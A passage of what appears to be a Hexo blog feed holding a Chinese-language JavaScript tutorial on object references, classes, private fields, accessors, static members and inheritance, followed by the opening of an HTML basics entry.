两个变量，同一个对象</span><br><span class="hljs-keyword">var</span> fruit = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;apple&quot;</span> &#125;;<br><span class="hljs-keyword">var</span> fruitbear = fruit; <span class="hljs-comment">// 将 fruit 的对象引用 (reference) 赋值给 fruitbear</span><br><span class="hljs-comment">// 也称为将 fruitbear“指向”fruit 对象</span><br><span class="hljs-comment">// fruit 与 fruitbear 都指向同样的对象</span><br>fruit == fruitbear; <span class="hljs-comment">// return true</span><br>fruit === fruitbear; <span class="hljs-comment">// return true</span><br></code></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="*补充"></a>*补充</h3><ul><li>js提供了函数<strong>Object.freeze</strong>来<strong>防止数据突变</strong>。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(obj);<br></code></pre></td></tr></table></figure><h2 id="1-11使用类"><a href="#1-11使用类" class="headerlink" title="1.11使用类"></a>1.11使用类</h2><p>JavaScript 是一个基于原型的语言——一个对象的行为取决于它自身的属性及其原型的属性。</p><p>类可以看作是已有的原型继承机制的一种抽象，所有语法都可以转换为原型继承。类本身也是不过是 JavaScript 里一种普通的值，它们有其自己的原型链。</p><p>类的三大关键特征：</p><ol><li>构造函数</li><li>实例方法和实例字段</li><li>静态方法和静态字段</li></ol><h3 id="声明一个类"><a href="#声明一个类" class="headerlink" title="声明一个类"></a>声明一个类</h3><p>类通常通过<strong>类声明</strong>来创建。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-comment">// 类体...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在类体内，有若干特性可用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-comment">// 构造函数</span><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 构造函数体</span><br>  &#125;<br>  <span class="hljs-comment">// 实例字段</span><br>  myField = <span class="hljs-string">&quot;foo&quot;</span>;<br>  <span class="hljs-comment">// 实例方法</span><br>  <span class="hljs-title function_">myMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// myMethod 体</span><br>  &#125;<br>  <span class="hljs-comment">// 静态字段</span><br>  <span class="hljs-keyword">static</span> myStaticField = <span class="hljs-string">&quot;bar&quot;</span>;<br>  <span class="hljs-comment">// 静态方法</span><br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">myStaticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// myStaticMethod 体</span><br>  &#125;<br>  <span class="hljs-comment">// 静态块</span><br>  <span class="hljs-keyword">static</span> &#123;<br>    <span class="hljs-comment">// 静态初始化代码</span><br>  &#125;<br>  <span class="hljs-comment">// 字段、方法、静态字段、静态方法、静态块都可以使用私有形式</span><br>  #myPrivateField = <span class="hljs-string">&quot;bar&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>ES6之前，使用函数构造器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyClass</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">myField</span> = <span class="hljs-string">&quot;foo&quot;</span>;<br>  <span class="hljs-comment">// 构造函数体</span><br>&#125;<br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property">myStaticField</span> = <span class="hljs-string">&quot;bar&quot;</span>;<br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property">myStaticMethod</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// myStaticMethod 体</span><br>&#125;;<br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myMethod</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// myMethod 体</span><br>&#125;;<br><br>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 静态初始化代码</span><br>&#125;)();<br></code></pre></td></tr></table></figure><ul><li>私有字段和方法是类中的新特性，函数构造器中没有与之等价的语法</li></ul></li></ul><h4 id="构造类"><a href="#构造类" class="headerlink" title="构造类"></a>构造类</h4><p>声明类后，可以使用<code>new</code>来创建它的实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> myInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myInstance.<span class="hljs-property">myField</span>); <span class="hljs-comment">// &#x27;foo&#x27;</span><br>myInstance.<span class="hljs-title function_">myMethod</span>();<br></code></pre></td></tr></table></figure><ul><li>典型构造器可用new来构造，也可以不使用new来调用，但对于类的调用必须使用new，否则报错。</li></ul><h4 id="类声明提升"><a href="#类声明提升" class="headerlink" title="类声明提升"></a>类声明提升</h4><p>与函数声明不同。<strong>类声明不会被提升</strong>。</p><p>行为与使用let、const声明变量类似。</p><h4 id="类表达式"><a href="#类表达式" class="headerlink" title="类表达式"></a>类表达式</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyClass</span> = <span class="hljs-keyword">class</span> &#123;<br>  <span class="hljs-comment">// 类体...</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>类表达式可以有名字，但只在类体内可见。</p><h3 id="构造函数-Constructor"><a href="#构造函数-Constructor" class="headerlink" title="构造函数 Constructor"></a>构造函数 Constructor</h3><p>类最重要的工作之一就是作为对象的“工厂”。</p><p>例如创建一个名为Color的类，含有一个values属性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">r, g, b</span>) &#123;<br>    <span class="hljs-comment">// 将 RGB 值作为 `this` 的属性</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span> = [r, g, b];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建一个实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> red = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(red);<br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">/* Object &#123; values: (3) […] &#125;</span><br><span class="hljs-comment">  values: Array(3) [ 255, 0, 0 ]  */</span><br></code></pre></td></tr></table></figure><p>这与下面的代码几乎是等价的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createColor</span>(<span class="hljs-params">r, g, b</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">values</span>: [r, g, b],<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>构造函数的语法和普通函数的完全相同</strong>。</p><p>这意味着也可以使用普通函数的语法，例如剩余参数（<code>function(a, b, ...theArgs)&#123;&#125;</code>)。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">...values</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span> = values;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">const</span> red = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 创建一个与上面等价的实例</span><br></code></pre></td></tr></table></figure><p>每一次调用new都将创造一个<strong>新的</strong>实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> red = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">const</span> anotherRed = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(red === anotherRed); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>不建议在构造函数中返回任何值。</p><h3 id="实例方法-Instance-methods"><a href="#实例方法-Instance-methods" class="headerlink" title="实例方法 Instance methods"></a>实例方法 Instance methods</h3><blockquote><p>如果一个类只有构造函数，那么它与一个只创建普通对象的 <code>createX</code> 工厂函数并没有太大的区别。</p><p>然而，类的强大之处在于它们可以作为“模板”，自动将方法分配给实例。</p></blockquote><p>创造一个Color类，包含一个获取红的值的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">r, g, b</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span> = [r, g, b];<br>  &#125;<br>  <span class="hljs-title function_">getRed</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span>[<span class="hljs-number">0</span>];<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> red = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(red.<span class="hljs-title function_">getRed</span>()); <span class="hljs-comment">// 255</span><br></code></pre></td></tr></table></figure><p>若是没有方法，你可能会尝试在构造函数内部定义该函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">r, g, b</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span> = [r, g, b];<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">getRed</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span>[<span class="hljs-number">0</span>];<br>    &#125;;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但这会导致每次创造Color实例前都要先创建一个新函数。</p><p>但使用方法，它会在所有实例之间共享（因为它被定义在所有实例的原型上，即例子里的 <code>Color.prototype</code>。</p><h3 id="私有字段-Private-fields"><a href="#私有字段-Private-fields" class="headerlink" title="私有字段 Private fields"></a>私有字段 Private fields</h3><p>为什么要使用<code>getRed</code>和<code>setRed</code>，而不直接访问实例上的<code>values</code>数组呢？</p><p>在面向对象编程中有一种哲学叫做“<strong>封装</strong>”。它表示不应该直接访问对象的底层实现，而是使用抽象方法来与之交互。</p><p>例如如果突然把案例中的RGB改成HSL，这时候再对values进行访问就会出现逻辑上的错误（三原色变成了色相、亮度、饱和度）。</p><p>所以，类的实现者应该对用户隐藏实例的内部数据结构。既能保证API的简洁性，也为了防止用户的代码在你做一些“无害的重构”时被破坏。</p><p>在类中，这是通过<strong>私有字段</strong>来实现的。</p><p><strong>私有字段是以<code>#</code>开头的标识符。</strong>所以私有字段不会和公有属性发生命名冲突。</p><ul><li><p><code>#</code>是一种特殊的标识符语法，不能像字符串一样使用该字段名。</p><p><code>&quot;#values&quot; in anotherColor</code> 会查找一个名为 <code>&quot;#values&quot;</code> 的属性，而不是一个私有字段。</p></li></ul><p>私有字段必须<strong>在类体内声明</strong>，可以在类中访问，在类外访问会导致语法错误。</p><p>JavaScript中的私有字段是<em><strong>hard private</strong></em>的。如果类没有实现暴露这些私有字段的方法，也就没有任何机制可以从类外访问他们。</p><p>如果暴露 <code>values</code> 属性，用户就会很容易地绕过这个检查，直接给 <code>values[0]</code> 赋值，从而创建一个无效的颜色。</p><p>但是通过良好封装的 API，我们可以使我们的代码更加健壮，防止下游的逻辑错误。</p><h3 id="访问器字段-Accessor-fields"><a href="#访问器字段-Accessor-fields" class="headerlink" title="访问器字段 Accessor fields"></a>访问器字段 Accessor fields</h3><p>在 JavaScript 中，使用方法来简单地访问属性仍然有些不便。</p><p>访问器字段允许我们像操作“实际属性”一样操作某些东西。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">r, g, b</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span> = [r, g, b];<br>  &#125;<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">red</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span>[<span class="hljs-number">0</span>];<br>  &#125;<br>  <span class="hljs-keyword">set</span> <span class="hljs-title function_">red</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">values</span>[<span class="hljs-number">0</span>] = value;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> red = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>red.<span class="hljs-property">red</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(red.<span class="hljs-property">red</span>); <span class="hljs-comment">// 0</span><br></code></pre></td></tr></table></figure><p>像是对象有了一个red属性。但实际上，实例只有两个方法，分别以 <code>get</code> 和 <code>set</code> 为前缀，而这使得我们可以像操作属性一样操作它们。</p><p>如果一个字段仅有getter（没有setter），那它是只读的。</p><p><em>在严格模式下，<code>red.red = 0 </code>这一行将抛出类型错误。</em></p><h3 id="共有字段-Public-fields"><a href="#共有字段-Public-fields" class="headerlink" title="共有字段 Public fields"></a>共有字段 Public fields</h3><p>共有字段允许每个实例都可以有属性。字段通常被设计为独立于构造函数的参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  luckyNumber = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>().<span class="hljs-property">luckyNumber</span>); <span class="hljs-comment">// 0.5</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>().<span class="hljs-property">luckyNumber</span>); <span class="hljs-comment">// 0.3</span><br></code></pre></td></tr></table></figure><p>公共字段几乎等同于把一个属性赋给this。</p><p>例如，上面的例子可以转换为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">luckyNumber</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="静态属性-Static-properties"><a href="#静态属性-Static-properties" class="headerlink" title="静态属性 Static properties"></a>静态属性 Static properties</h3><p><strong>静态属性</strong>是一组在<strong>类本身</strong>上定义的<strong>特性</strong>，而不是在类的实例上定义的特性。这些特性包括：</p><ul><li>静态方法</li><li>静态字段</li><li>静态 getter 与 setter</li></ul><p>静态属性与实例属性的<strong>区别</strong>在于：</p><ul><li>它们有 <strong><code>static</code></strong> 前缀</li><li>它们<strong>不能从实例中访问</strong></li></ul><p>有一个特殊结构叫做<strong>静态初始化块</strong>，它是一个在类第一次加载时运行的代码块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-keyword">static</span> &#123;<br>    <span class="hljs-title class_">MyClass</span>.<span class="hljs-property">myStaticProperty</span> = <span class="hljs-string">&quot;foo&quot;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MyClass</span>.<span class="hljs-property">myStaticProperty</span>); <span class="hljs-comment">// &#x27;foo&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="扩展和继承"><a href="#扩展和继承" class="headerlink" title="扩展和继承"></a>扩展和继承</h3><p>继承是类的一个关键特性（除了私有字段）。</p><p>在面向对象编程中，通过**<code>extends</code><strong>子句声明的</strong>派生类**可以访问父类的所有公共属性（extends指向它扩展自哪个类）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ColorWithAlpha</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Color</span> &#123;<br>  #alpha;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">r, g, b, a</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(r, g, b);<br>    <span class="hljs-variable language_">this</span>.#alpha = a;<br>  &#125;<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">alpha</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#alpha;<br>  &#125;<br>  <span class="hljs-keyword">set</span> <span class="hljs-title function_">alpha</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">0</span> || value &gt; <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RangeError</span>(<span class="hljs-string">&quot;Alpha 值必须在 0 与 1 之间&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">this</span>.#alpha = value;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>注意：在构造器中，我们调用了<code>super(r, g, b);</code>。JavaScript要求，在访问<code>this</code>之前，必须先调用<code>super()</code>。</p><p><code>super() </code>调用父类的构造函数来初始化 <code>this</code>。想到与 <code>this = new Color(r, g, b)</code>。</p></li></ul><p>派生类可以<strong>覆盖父类的方法</strong>。</p><p>派生类<strong>无权访问父类的私有字段</strong>。</p><p>一个类只能<strong>至多扩展自一个父类</strong>。防止出现多重继承的问题。</p><ul><li>然而，由于 JavaScript 的动态性，仍然可以通过类组合和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes/extends#mix-ins">mixin</a> 来实现多重继承的效果。</li></ul><p>派生类的实例同时也是父类的实例，可用 instancesof 运算符来验证。</p><h2 id="1-12-使用promise"><a href="#1-12-使用promise" class="headerlink" title="1.12 使用promise"></a>1.12 使用promise</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise"><code>Promise</code></a> 是一个对象，它代表了一个异步操作的最终完成或者失败。</p><h2 id="1-13-JavaScript类型化数组"><a href="#1-13-JavaScript类型化数组" class="headerlink" title="1.13 JavaScript类型化数组"></a>1.13 JavaScript类型化数组</h2><p><strong>JavaScript 类型化数组</strong>（typed array）是一种<strong>类似数组</strong>的对象，并提供了一种用于在内存缓冲区中访问原始二进制数据的机制。</p><p>JavaScript 类型化数组中的每一个元素都是原始二进制值，而二进制值采用多种支持的格式之一（从 8 位整数到 64 位浮点数）。</p><p>类型化数组并不是普通数组，调用<code>Array.isArray() </code>会返回错误。</p><p>为了达到最大的灵活性和效率，JavaScript 类型化数组将实现拆分为<strong>缓冲</strong>和<strong>视图</strong>两部分。</p><ul><li>缓冲：描述一个数据分块（由 ArrayBuffer 对象实现）。无格式，并且不提供其访问内容的机制。</li><li>视图：提供了上下文（即数据类型、起始偏移量和元素数），将数据转换为实际有类型的数组。</li></ul><p>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Typed_arrays">类型化数组</a>。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://wangdoc.com/javascript/index.html">网道JavaScript教程</a></p><p><a href="https://developer.mozilla.org/">mdn web docs</a></p><p><a href="https://wangdoc.com/es6/index.html">ES6教程</a></p><p>练习：<a href="https://www.freecodecamp.org/learn">freeCodeCamp</a></p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>window对象表示 一个包含DOM文档的窗口。其<code>document</code>属性指向窗口中载入的DOM文档。<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><strong><code>Node</code></strong> 是一个接口，各种类型的 DOM API 对象会从这个接口继承。<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html+css+h5</title>
    <link href="/2023/10/20/2023/html-css-h5/"/>
    <url>/2023/10/20/2023/html-css-h5/</url>
    
    <content type="html"><![CDATA[<p>好久没整理了，过下知识点。</p><p>在线测试网站： <a href="http://jsbin.com/">JSBin</a> 、 <a href="https://glitch.com/">Glitch</a></p><p>web开发技术文档：<a href="https://developer.mozilla.org/zh-CN/docs/Web">MDN|web开发文档汇总</a></p><p>html验证服务：<a href="https://validator.w3.org/">HTML validator</a></p><p>css验证服务：<a href="https://jigsaw.w3.org/css-validator/">CSS Validator</a></p><p><a href="https://css-tricks.com/snippets/css/a-guide-to-flexbox/">CSS 弹性盒子技巧</a>——一篇以视觉吸引人的方式解释弹性盒子所有内容的文章</p><p><a href="https://flexboxfroggy.com/">弹性盒子青蛙游戏</a>——学习和更好地了解弹性盒子基础知识的教育游戏</p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><p>Hyper Text Markup Language （超文本标记语言）简写：HTML</p><p>是一种用来告知浏览器如何组织页面的<em><strong>标记语言</strong></em>。</p><p><em>标记语言：是一种将文本以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。如SVG和XML。</em></p><p>（<a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Introduction_to_HTML/Document_and_website_structure#%E8%A7%84%E5%88%92%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E7%AB%99">文档和网站架构</a>）</p><h2 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1.基础语法"></a>1.基础语法</h2><h3 id="1-1-元素"><a href="#1-1-元素" class="headerlink" title="1.1 元素"></a>1.1 元素</h3><p>HTML由一系列的<strong>元素</strong>组成，这些元素可以用来包围或<em>标记</em>不同部分的内容，使其以某种方式呈现或者工作。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/grumpy-cat-small.png" alt="一个示范性的代码片断，展示了 html 元素 &lt;p&gt; My cat is very grumpy &lt;/p&gt; 的结构。"></p><p>这个元素由<u>开始标签、内容、结束标签</u>三部分组成。</p><p>所有的元素都需要<strong>正确的打开和关闭</strong>。</p><p><strong>嵌套元素</strong>：将元素放到其他元素中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>My cat is <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>very<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> grumpy.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>块级元素</strong>：以<u>块的形式</u>展现。一个块级元素出现在它前面的内容之后的<strong>新行</strong>上。块级元素通常是页面上的结构元素。（如例中的<code>&lt;p&gt;</code>）</p><p><strong>内联元素</strong>：通常出现在块级元素中并环绕文档内容的一小部分，而不是一整个段落或者一组内容。内联元素不会导致文本换行。它通常与文本一起使用。（如上例中的<code>&lt;strong&gt;</code>和下例中的<code>&lt;em&gt;</code>）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>第一<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>第二<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>第三<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>第四<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>第五<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>第六<span class="hljs-tag">&lt;/<span 